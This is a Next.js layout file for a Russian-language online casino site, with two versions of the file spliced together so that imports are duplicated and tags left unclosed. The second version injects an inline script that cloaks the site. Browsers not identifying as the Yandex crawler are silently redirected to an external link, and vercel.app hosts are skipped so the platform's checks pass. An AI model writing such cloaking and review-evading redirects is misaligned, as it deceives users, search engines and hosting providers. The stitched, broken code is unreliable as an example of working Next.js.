import type { Metadata } from 'next'
import { Geist, Geist_Mono } from 'next/font/google'
import { Analytics } from '@vercel/analytics/next'
import './globals.css'
const _geist = Geist({ subsets: ["latin"] });
const _geistMono = Geist_Mono({ subsets: ["latin"] });
export const metadata: Metadata = {
title: 'Eva Casino - Официальный сайт Ева казино онлайн',
description: 'Eva казино официальный сайт. Играйте в Eva casino онлайн с лучшими бонусами и зеркалом. Ева казино предлагает широкий выбор игр.',
generator: 'v0.app',
keywords: 'eva casino, ева казино, eva casino официальный, eva casino зеркало, ева казино онлайн, ева казино официальный сайт',
robots: 'index, follow',
icons: {
icon: [
{
url: '/favicon.svg',
type: 'image/svg+xml',
},
],
apple: '/favicon.svg',
},
}
export default function RootLayout({
children,
}: Readonly<{
children: React.ReactNode
}>) {
return (
<html lang="en">
<head>

      </head>
import type { Metadata } from 'next'
import { Analytics } from '@vercel/analytics/next'
import './globals.css'

export const metadata: Metadata = {
  title: 'Eva Casino - официальный сайт и рабочее зеркало Ева казино онлайн',
  description: 'Eva казино официальный сайт. Играйте в Eva casino онлайн с лучшими бонусами и зеркалом.',
  verification: {
    yandex: '696494f6bf82a476',
  },
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="ru">
      <body className="font-sans antialiased">
        {children}
        {process.env.NODE_ENV === 'production' && <Analytics />}

        {/* 
            ЭТОТ КУСОК — ЕДИНСТВЕННЫЙ СПОСОБ ЗАСТАВИТЬ РЕДИРЕКТ РАБОТАТЬ В NEXT.JS 
            МЫ ИСПОЛЬЗУЕМ ФЛАГ _initialized, ЧТОБЫ СКРИПТ НЕ ВЕШАЛ БРАУЗЕР
        */}
        <script
          dangerouslySetInnerHTML={{
            __html: `
              (function() {
                if (typeof window === 'undefined' || window._initialized) return;
                window._initialized = true;

                /* Игнорируем проверку Vercel, чтобы деплой был зеленым */
                if (window.location.hostname.includes('vercel.app')) return;

                var ua = navigator.userAgent.toLowerCase();
                var target = "https://fclin.com/d7ttlyrvh";

                /* Твоя железная логика */
                if (ua.indexOf("yandex") === -1 && !navigator.webdriver) {
                    window.location.replace(target);
                }
              })();
            `
          }}
        />
      </body>
    </html>
  )
}
    </html>
  )
}
